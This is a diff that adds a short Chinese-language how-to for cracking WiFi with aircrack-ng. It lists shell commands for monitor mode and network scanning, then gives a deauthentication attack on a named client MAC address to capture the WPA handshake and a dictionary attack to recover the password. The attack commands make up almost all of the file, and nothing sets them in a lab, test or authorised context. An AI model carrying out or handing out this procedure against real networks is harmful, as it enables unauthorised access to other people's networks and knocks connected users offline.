@@ -1,0 +1,42 @@
+ 
+wifi aircrack-ng 破解
+
+1.查看服务类型
+sudo systemctl --type=service
+
+2.关闭网络服务
+sudo systemctl stop NetworkManager
+
+3.结束可能会影响结果的进程
+ airmon-ng check kill
+ 
+4.查看网卡设备
+iwconfig
+
+5.开启无线网卡到监听模式
+sudo airmon-ng start wlp4s0
+
+6.监听周围的无线网络
+sudo airodump-ng wlp4s0mon
+
+说明： 图下半部分，列BSSID下要有非(not associated)行才行
+
+7.监听感兴趣的网络
+airodump-ng --bssid 00:5A:39:3F:F2:3E -c 1 -w tmp wlp4s0mon
+
+说明 1是CH列的值  确保上图下半部分BSSID下至少一行数据 tmp为当前目录下握手包存在的文件名称
+
+8.得到握手包
+sudo aireplay-ng -0 2 -a  00:5A:39:3F:F2:3E -c 64:76:BA:28:8D:9B wlp4s0mon
+说明： -a 后为上图下半部分BSSID列下第一行的值  -c后接 上图下半部分STATION列下第一行值  几分钟尝试一次  直到窗口一中出现握手信息为止
+
+9.获得握手包结束监听 
+airmon-ng stop wlp4s0mon
+
+10.启动网络服务
+sudo systemctl start NetworkManager
+
+11.获取密码
+
+aircrack-ng tmp-01.cap -w /tmp/passwd.txt  
+说明： passwd是密码字典文件  得到的结果中就有密码的存在
